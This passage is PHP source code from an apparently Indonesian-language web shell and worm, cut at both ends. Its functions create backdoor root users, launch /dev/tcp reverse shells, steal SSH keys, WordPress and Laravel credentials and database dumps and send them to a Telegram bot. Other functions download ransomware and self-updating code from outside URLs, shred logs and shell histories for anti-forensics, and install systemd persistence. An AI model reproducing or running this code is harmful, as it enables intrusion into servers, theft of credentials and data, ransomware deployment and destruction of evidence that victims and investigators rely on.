    $roots = get_all_document_roots_cached();
    foreach ($roots as $root) {
        if (!is_dir($root) || !is_readable($root)) continue;
        foreach ($patterns as $pattern) {
            $files = @glob($root . $pattern);
            if ($files !== false) { 
                foreach ($files as $file) {
                    if (is_file($file) && is_readable($file)) {
                        $found[] = $file . " (" . formatSize(filesize($file)) . ")";
                    }
                }
            }
            $subs = @glob($root . '/*/' . ltrim($pattern, '/'));
            if ($subs !== false) { 
                foreach ($subs as $file) {
                    if (is_file($file) && is_readable($file)) {
                        $found[] = $file . " (" . formatSize(filesize($file)) . ")";
                    }
                }
            }
        }
    }
    if (!empty($found)) { 
        $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found); 
        sendTelegramMessage($botToken, $telegramUserId, $msg); 
        return $found; 
    } else { 
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif."); 
        return []; 
    }
}

// ==================== BACKDOOR USER CREATOR ====================
function create_backdoor_user($username, $password) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $output = @shell_exec("useradd -m -s /bin/bash " . escapeshellarg($username) . " 2>&1");
    if (strpos($output, 'exists') !== false) return "⚠️ User $username sudah ada.";
    @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>&1");
    @shell_exec("usermod -aG sudo " . escapeshellarg($username) . " 2>&1");
    @shell_exec("usermod -aG wheel " . escapeshellarg($username) . " 2>&1");
    $uid = @shell_exec("id -u " . escapeshellarg($username) . " 2>&1");
    return "✅ User $username berhasil dibuat (UID: $uid) dengan password: $password";
}

// ==================== REVERSE SHELL MANAGER ====================
function start_reverse_shell($ip, $port) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $script = "/tmp/rshell_$port.sh";
    $content = "#!/bin/bash\nbash -i >& /dev/tcp/$ip/$port 0>&1\n";
    if (@file_put_contents($script, $content) === false) return "❌ Gagal menulis script.";
    @chmod($script, 0755);
    @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
    sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ Reverse shell ke $ip:$port telah dimulai.");
    return true;
}

function stop_reverse_shell($port) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $result = @shell_exec("pkill -f 'rshell_$port' 2>&1");
    return "✅ Reverse shell port $port dihentikan.";
}

function status_reverse_shell() {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $output = @shell_exec("ps aux | grep rshell_ | grep -v grep");
    if (empty($output)) return "❌ Tidak ada reverse shell aktif.";
    return "✅ Reverse shell aktif:\n$output";
}

// ==================== ADVANCED LOG CLEANER ====================
function clean_logs_advanced() {
    $logDirs = ['/var/log/apache2', '/var/log/nginx', '/var/log/httpd', '/var/log', '/var/log/mysql', '/var/log/postgresql'];
    $files = [];
    foreach ($logDirs as $dir) {
        if (is_dir($dir)) {
            $found = @glob("$dir/*.log"); 
            if ($found !== false) $files = array_merge($files, $found);
            $found = @glob("$dir/*.log.*"); 
            if ($found !== false) $files = array_merge($files, $found);
        }
    }
    $count = 0;
    foreach ($files as $file) { 
        if (is_writable($file)) { 
            @file_put_contents($file, ''); 
            $count++; 
        } 
    }
    if (function_exists('shell_exec')) {
        $users = @explode("\n", @shell_exec('ls /home 2>/dev/null'));
        if ($users !== false) {
            foreach ($users as $user) {
                $user = trim($user); 
                if (empty($user)) continue;
                $hist = "/home/$user/.bash_history"; 
                if (file_exists($hist)) @file_put_contents($hist, '');
                $hist = "/home/$user/.mysql_history"; 
                if (file_exists($hist)) @file_put_contents($hist, '');
            }
        }
        if (file_exists('/root/.bash_history')) @file_put_contents('/root/.bash_history', '');
        if (file_exists('/root/.mysql_history')) @file_put_contents('/root/.mysql_history', '');
        $tmpFiles = @glob('/tmp/*.php');
        if ($tmpFiles !== false) array_map('unlink', $tmpFiles);
        $varTmpFiles = @glob('/var/tmp/*.php');
        if ($varTmpFiles !== false) array_map('unlink', $varTmpFiles);
    }
    return "✅ Log dan history dibersihkan ($count file log dihapus).";
}

// ==================== SSH KEY GRABBER ====================
function grab_ssh_keys() {
    global $botToken, $telegramUserId;
    $keys = [];
    if (function_exists('shell_exec')) {
        $users = @explode("\n", @shell_exec('ls /home 2>/dev/null'));
        if ($users !== false) {
            foreach ($users as $user) {
                $user = trim($user); 
                if (empty($user)) continue;
                $home = "/home/$user"; 
                $sshDir = $home . '/.ssh';
                if (is_dir($sshDir)) {
                    $privKeys = @glob("$sshDir/id_*");
                    if ($privKeys !== false) { 
                        foreach ($privKeys as $key) {
                            if (is_file($key) && is_readable($key)) {
                                $keys[] = "User: $user - File: " . basename($key) . "\n" . file_get_contents($key);
                            }
                        }
                    }
                    $auth = $sshDir . '/authorized_keys';
                    if (file_exists($auth) && is_readable($auth)) {
                        $keys[] = "User: $user - authorized_keys:\n" . file_get_contents($auth);
                    }
                }
            }
        }
        $rootSsh = '/root/.ssh';
        if (is_dir($rootSsh)) {
            $privKeys = @glob("$rootSsh/id_*");
            if ($privKeys !== false) { 
                foreach ($privKeys as $key) {
                    if (is_file($key) && is_readable($key)) {
                        $keys[] = "User: root - File: " . basename($key) . "\n" . file_get_contents($key);
                    }
                }
            }
            $auth = $rootSsh . '/authorized_keys';
            if (file_exists($auth) && is_readable($auth)) {
                $keys[] = "User: root - authorized_keys:\n" . file_get_contents($auth);
            }
        }
    }
    if (!empty($keys)) { 
        $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys); 
        sendTelegramMessage($botToken, $telegramUserId, $msg); 
        return $keys; 
    } else { 
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada SSH keys ditemukan."); 
        return []; 
    }
}

// ==================== WORDPRESS & LARAVEL SCANNER ====================
function scan_wordpress_laravel() {
    global $botToken, $telegramUserId;
    $found = [];
    $roots = get_all_document_roots_cached();
    foreach ($roots as $root) {
        if (!is_dir($root)) continue;
        if (file_exists($root . '/wp-config.php') && is_readable($root . '/wp-config.php')) {
            $content = @file_get_contents($root . '/wp-config.php');
            if ($content !== false) {
                preg_match_all("/define\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $matches);
                if (!empty($matches[2])) $found[] = "📝 WordPress at $root\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[1], $matches[2]));
                if (file_exists($root . '/wp-includes/version.php') && is_readable($root . '/wp-includes/version.php')) {
                    $v_content = @file_get_contents($root . '/wp-includes/version.php');
                    if ($v_content && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $v_content, $v_match)) {
                        $found[] = "📌 WP Version: " . $v_match[1];
                    }
                }
            }
        }
        if (file_exists($root . '/.env') && is_readable($root . '/.env')) {
            $content = @file_get_contents($root . '/.env');
            if ($content !== false) {
                preg_match_all("/(DB_|APP_|REDIS_|MAIL_|PUSHER_)([A-Z_]+)\s*=\s*([^\s]+)/", $content, $matches);
                if (!empty($matches[3])) $found[] = "📝 Laravel .env at $root\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[2], $matches[3]));
                if (preg_match('/APP_KEY\s*=\s*(.+)/', $content, $key_match)) {
                    $found[] = "🔑 APP_KEY: " . trim($key_match[1]);
                }
                if (preg_match('/APP_ENV\s*=\s*(.+)/', $content, $env_match)) {
                    $found[] = "⚙️ APP_ENV: " . trim($env_match[1]);
                }
            }
        }
        $subs = @glob($root . '/*', GLOB_ONLYDIR);
        if ($subs !== false) {
            foreach ($subs as $sub) {
                if (file_exists($sub . '/wp-config.php') && is_readable($sub . '/wp-config.php')) {
                    $content = @file_get_contents($sub . '/wp-config.php');
                    if ($content !== false) {
                        preg_match_all("/define\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $matches);
                        if (!empty($matches[2])) $found[] = "📝 WordPress at $sub\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[1], $matches[2]));
                    }
                }
                if (file_exists($sub . '/.env') && is_readable($sub . '/.env')) {
                    $content = @file_get_contents($sub . '/.env');
                    if ($content !== false) {
                        preg_match_all("/(DB_|APP_)([A-Z_]+)\s*=\s*([^\s]+)/", $content, $matches);
                        if (!empty($matches[3])) $found[] = "📝 Laravel .env at $sub\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[2], $matches[3]));
                    }
                }
            }
        }
    }
    if (!empty($found)) { 
        $msg = "🔍 *WordPress & Laravel Credentials*\n\n" . implode("\n\n", $found); 
        sendTelegramMessage($botToken, $telegramUserId, $msg); 
        return $found; 
    } else { 
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial WordPress/Laravel."); 
        return []; 
    }
}

// ==================== DATABASE DUMPING ====================
function dump_databases() {
    $dumps = [];
    $configFiles = ['config.php', '.env', 'wp-config.php', 'database.php', 'db.php'];
    $found = [];
    foreach ($configFiles as $cfg) {
        $path = __DIR__ . '/' . $cfg; 
        if (file_exists($path) && is_readable($path)) $found[] = $path;
        $subs = @glob(__DIR__ . '/*/' . $cfg); 
        if ($subs !== false) {
            foreach ($subs as $f) {
                if (file_exists($f) && is_readable($f)) $found[] = $f;
            }
        }
    }
    foreach ($found as $file) {
        $content = @file_get_contents($file);
        if ($content === false) continue;
        preg_match_all('/[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD)[\'"]?\s*=>?\s*[\'"]([^\'"]+)[\'"]/i', $content, $matches);
        if (!empty($matches[2])) $dumps[] = "📁 " . basename($file) . ":\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[1], $matches[2]));
    }
    if (function_exists('shell_exec')) {
        $output = @shell_exec('mysql --version 2>&1');
        if (strpos($output, 'mysql') !== false) {
            $dbHost = getenv('DB_HOST') ?: 'localhost';
            $dbUser = getenv('DB_USER') ?: 'root';
            $dbPass = getenv('DB_PASS') ?: '';
            $dbName = getenv('DB_NAME') ?: '';
            if ($dbUser && $dbPass && $dbName) {
                $dumpFile = '/tmp/db_dump_' . time() . '.sql';
                $cmd = "mysqldump -h" . escapeshellarg($dbHost) . " -u" . escapeshellarg($dbUser) . " -p" . escapeshellarg($dbPass) . " " . escapeshellarg($dbName) . " > " . escapeshellarg($dumpFile) . " 2>&1";
                @shell_exec($cmd);
                if (file_exists($dumpFile) && filesize($dumpFile) > 100) $dumps[] = "💾 Database dump: " . $dumpFile . " (" . formatSize(filesize($dumpFile)) . ")";
            }
        }
    }
    return $dumps;
}

if (isset($_GET['dumpdb_send']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $dumps = dump_databases();
    $msg = empty($dumps) ? "❌ Tidak ditemukan database atau kredensial." : "💾 *Database Dump*\n" . implode("\n", $dumps);
    if (strlen($msg) > 4000) $msg = substr($msg, 0, 4000) . "\n... (dipotong)";
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    echo "✅ Database dump telah dikirim ke Telegram.";
    exit;
}

// ==================== AUTO-UPDATE WORM ====================
function worm_auto_update() {
    global $botToken, $telegramUserId;
    $remoteUrl = 'https://pastebin.com/raw/xxxxxxxx';
    $versionFile = __DIR__ . '/.version';
    $localVersion = file_exists($versionFile) ? @file_get_contents($versionFile) : '1.0';
    
    $remoteVersion = false;
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $remoteUrl . '?v=' . time());
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $remoteVersion = curl_exec($ch);
        curl_close($ch);
    }
    
    if (!$remoteVersion && function_exists('file_get_contents')) {
        $remoteVersion = @file_get_contents($remoteUrl . '?v=' . time());
    }
    
    if ($remoteVersion && trim($remoteVersion) != trim($localVersion)) {
        $newFile = __DIR__ . '/.update.tmp';
        if (@file_put_contents($newFile, $remoteVersion) !== false) {
            @rename($newFile, __FILE__);
            @file_put_contents($versionFile, trim($remoteVersion));
            @chmod(__FILE__, 0644);
            sendTelegramMessage($botToken, $telegramUserId, "✅ Worm telah di-update ke versi " . trim($remoteVersion));
            return true;
        }
    }
    return false;
}

// ==================== LIST SPREAD FILES ====================
function list_spread_files() {
    global $botToken, $telegramUserId;
    $found = [];
    $targets = get_all_document_roots_cached();
    $domains = get_all_domains_by_ip_cached();
    $myFile = basename(__FILE__);
    foreach ($targets as $dir) {
        $path = $dir . '/' . $myFile;
        if (file_exists($path)) {
            $domain = 'unknown';
            foreach ($domains as $d) if (strpos($dir, $d) !== false) { $domain = $d; break; }
            if ($domain == 'unknown') {
                $parts = explode('/', $dir);
                $last = end($parts);
                if (strpos($last, '.') !== false) $domain = $last;
            }
            $url = "http://{$domain}/{$myFile}";
            $found[] = "$url  $dir";
        }
    }
    if (!empty($found)) { 
        $msg = "📋 *Spread Files List*\n\n" . implode("\n", $found); 
        sendTelegramMessage($botToken, $telegramUserId, $msg); 
    } else sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan.");
}

// ==================== RANSOMWARE CREATOR ====================
function create_ransomware() {
    global $botToken, $telegramUserId;
    $url = 'https://raw.githubusercontent.com/Iqyans/IqyanCodes/refs/heads/main/R.php';
    $targetDir = __DIR__;
    $targetFile = $targetDir . '/R.php';
    $code = @file_get_contents($url);
    if ($code === false && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $code = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($httpCode !== 200) $code = false;
    }
    if ($code === false || empty($code)) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Gagal mengunduh ransomware.");
        return false;
    }
    if (@file_put_contents($targetFile, $code) === false) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Gagal menyimpan R.php.");
        return false;
    }
    @chmod($targetFile, 0644);
    $domain = $_SERVER['HTTP_HOST'] ?? '';
    if (empty($domain) || $domain == 'localhost') {
        $domains = get_all_domains_by_ip_cached();
        $domain = $domains[0] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
    }
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    $relativePath = '';
    if ($docRoot && strpos($targetDir, $docRoot) === 0) {
        $relativePath = ltrim(substr($targetDir, strlen($docRoot)), '/');
        if ($relativePath) $relativePath .= '/';
    } else {
        $relativePath = basename($targetDir) . '/';
    }
    $urlPath = $relativePath . 'R.php';
    $fullUrl = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $domain . '/' . ltrim($urlPath, '/');
    $msg = "💀 Ransomware berhasil dibuat.\n"
         . "📍 Lokasi: <a href='$fullUrl'>$fullUrl</a>\n"
         . "📁 Path fisik: $targetFile";
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return true;
}

// ==================== SELF-DESTRUCTION ====================
function self_destruct_ultimate() {
    global $botToken, $telegramUserId;
    $script_path = __FILE__;
    $script_name = basename($script_path);
    $results = [];

    if (function_exists('curl_init') && is_readable($script_path)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendDocument");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $telegramUserId,
            'document' => new CURLFile($script_path),
            'caption' => "💀 Self-Destruct: " . basename($script_path) . "\nServer: " . $_SERVER['HTTP_HOST']
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
        $results[] = "File sent to Telegram as backup";
    }

    $backup_dirs = ['/tmp/', '/var/tmp/', '/dev/shm/', dirname(__DIR__) . '/.cache/'];
    foreach ($backup_dirs as $dir) {
        if (is_dir($dir)) {
            $pattern = $dir . '*' . md5($script_name) . '*.inc';
            foreach (glob($pattern) as $f) {
                if (function_exists('shell_exec')) {
                    @shell_exec("shred -fuz " . escapeshellarg($f) . " 2>/dev/null");
                }
                @unlink($f);
                $results[] = "Deleted backup: " . basename($f);
            }
        }
    }

    if (function_exists('shell_exec')) {
        $crontab = @shell_exec('crontab -l 2>/dev/null');
        $crontab = preg_replace('/.*' . preg_quote($script_name, '/') . '.*\n/', '', $crontab);
        $crontab = preg_replace('/.*cache_repair.*\n/', '', $crontab);
        if ($crontab !== null) {
            @file_put_contents('/tmp/cron.tmp', $crontab);
            @shell_exec('crontab /tmp/cron.tmp 2>/dev/null');
            @unlink('/tmp/cron.tmp');
        }
        $results[] = 'Cron jobs removed';
    }

    if (isRoot()) {
        @shell_exec('systemctl stop dkd_cache.service 2>/dev/null');
        @shell_exec('systemctl disable dkd_cache.service 2>/dev/null');
        @unlink('/etc/systemd/system/dkd_cache.service');
        @shell_exec('systemctl daemon-reload 2>/dev/null');
        $results[] = 'Systemd service removed';
        @unlink('/etc/init.d/dkd_cache');
        @shell_exec('update-rc.d dkd_cache remove 2>/dev/null');
        @shell_exec('chkconfig --del dkd_cache 2>/dev/null');
        $results[] = 'Init script removed';
        if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
            $rc = file_get_contents('/etc/rc.local');
            if ($rc !== false) {
                $rc = preg_replace('/.*' . preg_quote($script_name, '/') . '.*\n/', '', $rc);
                file_put_contents('/etc/rc.local', $rc);
                $results[] = 'rc.local cleaned';
            }
        }
        $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/system-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/sudo'];
        foreach ($pam_files as $file) {
            if (file_exists($file) && is_writable($file)) {
                $content = file_get_contents($file);
                if ($content !== false) {
                    $lines = explode("\n", $content);
                    $new_lines = array_filter($lines, function($line) {
                        return strpos($line, 'DKD_BACKDOOR') === false;
                    });
                    if (count($new_lines) != count($lines)) {
                        file_put_contents($file, implode("\n", $new_lines));
                        $results[] = 'PAM cleaned from ' . basename($file);
                    }
                }
            }
        }
    }

    $home = getenv('HOME') ?: __DIR__;
    $bashrc_paths = [$home . '/.bashrc', $home . '/.profile', $home . '/.bash_profile'];
    foreach ($bashrc_paths as $bashrc) {
        if (file_exists($bashrc) && is_writable($bashrc)) {
            $content = file_get_contents($bashrc);
            if ($content !== false) {
                $content = preg_replace('/.*' . preg_quote($script_name, '/') . '.*\n/', '', $content);
                file_put_contents($bashrc, $content);
                $results[] = 'Cleaned ' . basename($bashrc);
            }
        }
    }

    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
    $user_ini_path = $doc_root . '/.user.ini';
    if (file_exists($user_ini_path) && is_writable($user_ini_path)) {
        $content = file_get_contents($user_ini_path);
        if ($content !== false) {
            $content = preg_replace('/auto_prepend_file\s*=.*\n/', '', $content);
            file_put_contents($user_ini_path, $content);
            if (trim($content) == '') @unlink($user_ini_path);
            $results[] = '.user.ini cleaned';
        }
    }

    $htaccess_path = $doc_root . '/.htaccess';
    if (file_exists($htaccess_path) && is_writable($htaccess_path)) {
        $content = file_get_contents($htaccess_path);
        if ($content !== false) {
            $content = preg_replace('/# DKD_PERSISTENCE.*\n/', '', $content);
            $content = preg_replace('/php_value auto_prepend_file.*\n/', '', $content);
            file_put_contents($htaccess_path, $content);
            $results[] = '.htaccess cleaned';
        }
    }

    if (function_exists('shell_exec')) {
        @shell_exec("shred -fuz " . escapeshellarg($script_path) . " 2>/dev/null");
    }
    @unlink($script_path);
    $results[] = 'Self deleted: ' . $script_path;

    $msg = "💀 *Self-Destruction Completed*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    session_destroy();
    exit;
}

// ==================== ANTI-FORENSIC ====================
function anti_forensic_ultimate() {
    global $botToken, $telegramUserId;
    $results = [];

    $log_patterns = [
        '/var/log/*.log', '/var/log/apache2/*.log', '/var/log/nginx/*.log',
        '/var/log/httpd/*.log', '/var/log/mysql/*.log', '/var/log/postgresql/*.log',
        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
        '/var/log/messages', '/var/log/faillog', '/var/log/lastlog',
        '/var/log/wtmp', '/var/log/btmp'
    ];
    foreach ($log_patterns as $pattern) {
        foreach (glob($pattern) as $file) {
            if (is_writable($file) && function_exists('shell_exec')) {
                @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
                $results[] = "Shredded: $file";
            } elseif (is_writable($file)) {
                $size = @filesize($file);
                if ($size !== false && $size > 0) {
                    @file_put_contents($file, str_repeat("\x00", $size));
                }
                @unlink($file);
                $results[] = "Zeroed and deleted: $file";
            }
        }
    }

    $temp_dirs = ['/tmp/', '/var/tmp/', '/dev/shm/'];
    foreach ($temp_dirs as $dir) {
        if (is_dir($dir)) {
            $files = @glob($dir . '*');
            if ($files !== false) {
                foreach ($files as $file) {
                    if (is_file($file) && strpos($file, 'locker') === false) {
                        if (function_exists('shell_exec')) {
                            @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
                        }
                        @unlink($file);
                        $results[] = "Cleaned: $file";
                    }
                }
            }
        }
    }

    $users = [];
    if (function_exists('shell_exec')) {
        $userList = @shell_exec('ls /home 2>/dev/null');
        if ($userList) $users = array_filter(explode("\n", trim($userList)));
        $users[] = 'root';
    }
    foreach ($users as $user) {
        $home = ($user === 'root') ? '/root' : "/home/$user";
        $history_files = [
            "$home/.bash_history", "$home/.zsh_history", "$home/.mysql_history",
            "$home/.psql_history", "$home/.python_history", "$home/.node_repl_history"
        ];
        foreach ($history_files as $file) {
            if (file_exists($file) && is_writable($file)) {
                if (function_exists('shell_exec')) {
                    @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
                }
                @file_put_contents($file, '');
                $results[] = "Cleared: $file";
            }
        }
    }

    if (isRoot() && function_exists('shell_exec')) {
        @shell_exec("dd if=/dev/urandom of=/tmp/wipe.tmp bs=1M count=10 2>/dev/null; rm -f /tmp/wipe.tmp 2>/dev/null");
        $results[] = "Free space wiped (10MB)";
    }

    if (file_exists(__FILE__)) {
        $old_time = strtotime('2020-01-01 00:00:00');
        @touch(__FILE__, $old_time, $old_time);
        $results[] = "Timestamp modified";
    }

    foreach (['/var/log', '/var/log/apache2', '/var/log/nginx', '/var/log/httpd'] as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            @chmod($dir, 0000);
            $results[] = "Locked log dir: $dir";
        }
    }

    $msg = "🧹 *Anti-Forensic Ultimate Executed*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

// ==================== BYPASS SUHOSIN ====================
function bypass_suhosin() {
    global $botToken, $telegramUserId;
    $results = [];
    $disabled_functions = ini_get('disable_functions');
    $open_basedir = ini_get('open_basedir');
    $suhosin_disable_eval = ini_get('suhosin.executor.disable_eval');

    $results[] = "📊 *Suhosin Status*";
    $results[] = "Disabled Functions: " . ($disabled_functions ?: 'none');
    $results[] = "open_basedir: " . ($open_basedir ?: 'none');
    $results[] = "suhosin.executor.disable_eval: " . ($suhosin_disable_eval ? 'ON' : 'OFF');

    $bypass_methods = [];
    if (function_exists('dl') && !in_array('dl', explode(',', $disabled_functions))) {
        @dl('suhosin.so');
        $bypass_methods[] = 'dl()';
    }
    if (function_exists('shell_exec') && isRoot()) {
        @shell_exec('echo "int getuid() { return 0; }" > /tmp/bypass.c 2>/dev/null');
        @shell_exec('gcc -shared -fPIC /tmp/bypass.c -o /tmp/bypass.so 2>/dev/null');
        @shell_exec('export LD_PRELOAD=/tmp/bypass.so 2>/dev/null');
        $bypass_methods[] = 'LD_PRELOAD';
    }
    $shell_funcs = ['pcntl_exec', 'proc_open', 'popen', 'system', 'exec', 'passthru'];
    foreach ($shell_funcs as $func) {
        if (function_exists($func) && !in_array($func, explode(',', $disabled_functions))) {
            $bypass_methods[] = $func;
        }
    }

    if (empty($bypass_methods)) {
        $results[] = "\n❌ No bypass methods available!";
    } else {
        $results[] = "\n✅ Available bypass methods: " . implode(', ', $bypass_methods);
    }

    $msg = implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => $msg];
}

// ==================== FTP ACCOUNT CREATOR ====================
function create_ftp_account($username, $password, $home_dir = '') {
    global $botToken, $telegramUserId;
    if (!function_exists('shell_exec')) return ['success' => false, 'msg' => '❌ shell_exec tidak tersedia'];

    $home_dir = $home_dir ?: '/home/' . $username;
    $results = [];

    if (file_exists('/usr/bin/pure-pw')) {
        $cmd = "echo '" . escapeshellarg($password) . "' | pure-pw useradd " . escapeshellarg($username) . " -u www-data -g www-data -d " . escapeshellarg($home_dir) . " 2>&1";
        $output = @shell_exec($cmd);
        @shell_exec('pure-pw mkdb 2>/dev/null');
        if (strpos($output, 'Error') === false) {
            $results[] = "PureFTPd account created: $username";
        }
    }
    if (file_exists('/etc/vsftpd.conf')) {
        $ftp_user_file = '/etc/vsftpd.userlist';
        if (!file_exists($ftp_user_file)) $ftp_user_file = '/etc/vsftpd.user_list';
        if (file_exists($ftp_user_file) && is_writable($ftp_user_file)) {
            file_put_contents($ftp_user_file, $username . "\n", FILE_APPEND);
            @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>/dev/null");
            $results[] = "vsftpd account added: $username";
        }
    }
    if (file_exists('/usr/bin/ftpasswd')) {
        $ftp_passwd = '/etc/proftpd/passwd';
        if (is_writable(dirname($ftp_passwd))) {
            $cmd = "ftpasswd --passwd --name=" . escapeshellarg($username) . " --uid=33 --gid=33 --home=" . escapeshellarg($home_dir) . " --shell=/bin/false --file=" . escapeshellarg($ftp_passwd) . " --stdin <<< " . escapeshellarg($password) . " 2>/dev/null";
            @shell_exec($cmd);
            $results[] = "ProFTPd account created: $username";
        }
    }
    if (is_cpanel_installed() && function_exists('cpanel_api_request')) {
        $params = ['user' => $username, 'pass' => $password, 'homedir' => $home_dir, 'quota' => 100];
        $result = cpanel_api_request('Ftp::add_ftp', $params, 'POST');
        if (!isset($result['error'])) {
            $results[] = "cPanel FTP account created: $username";
        }
    }

    if (empty($results)) {
        return ['success' => false, 'msg' => '❌ Tidak ada metode FTP yang ditemukan'];
    }

    $msg = "📂 *FTP Account Created*\n\nUsername: $username\nPassword: $password\nHome: $home_dir\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

// ==================== MAIL ACCOUNT CREATOR ====================
function create_mail_account($email, $password, $domain = '') {
    global $botToken, $telegramUserId;
    if (!function_exists('shell_exec')) return ['success' => false, 'msg' => '❌ shell_exec tidak tersedia'];

    $domain = $domain ?: $_SERVER['HTTP_HOST'] ?? 'localhost';
    $username = explode('@', $email)[0];
    $results = [];

    if (is_cpanel_installed() && function_exists('cpanel_api_request')) {
        $params = ['email' => $email, 'password' => $password, 'quota' => 100, 'domain' => $domain];
        $result = cpanel_api_request('Email::add_pop', $params, 'POST');
        if (!isset($result['error'])) {
            $results[] = "cPanel email account created: $email";
        }
    }
    if (file_exists('/etc/postfix/virtual') && is_writable('/etc/postfix/virtual')) {
        file_put_contents('/etc/postfix/virtual', "$email " . $username . '@' . $domain . "\n", FILE_APPEND);
        @shell_exec('postmap /etc/postfix/virtual 2>/dev/null');
        @shell_exec('postfix reload 2>/dev/null');
        $results[] = "Postfix virtual added: $email";
        if (file_exists('/usr/bin/doveadm')) {
            @shell_exec("doveadm user -a " . escapeshellarg($username) . " 2>/dev/null");
            $results[] = "Dovecot user created: $username";
        }
    }
    if (file_exists('/etc/exim.conf') || file_exists('/usr/sbin/exim')) {
        $exim_user = '/etc/exim/domains/' . $domain . '/passwd';
        if (!is_dir(dirname($exim_user))) @mkdir(dirname($exim_user), 0755, true);
        $hash = @shell_exec("doveadm pw -s SHA512-CRYPT -p " . escapeshellarg($password) . " 2>/dev/null");
        if ($hash) {
            file_put_contents($exim_user, $username . ':' . trim($hash) . '::' . $domain . "\n", FILE_APPEND);
            $results[] = "Exim account created: $email";
        }
    }

    if (empty($results)) {
        return ['success' => false, 'msg' => '❌ Tidak ada metode email yang ditemukan'];
    }

    $msg = "📧 *Mail Account Created*\n\nEmail: $email\nPassword: $password\nDomain: $domain\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['success' => true, 'msg' => implode("\n", $results)];
}

// ==================== DEEP PERSISTENCE ====================
function install_deep_persistence() {
    global $botToken, $telegramUserId;
    if (!isRoot()) return ['success' => false, 'msg' => '❌ Harus root'];
    
    $script_path = __FILE__;
    $script_name = basename($script_path);
    $php_path = trim(@shell_exec('which php 2>/dev/null')) ?: '/usr/bin/php';
    $results = [];

    $service_content = '[Unit]
Description=System Cache Daemon
After=network.target

[Service]
Type=simple
ExecStart=' . $php_path . ' ' . escapeshellarg($script_path) . ' --daemon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
';
    @file_put_contents('/etc/systemd/system/dkd_cache.service', $service_content);
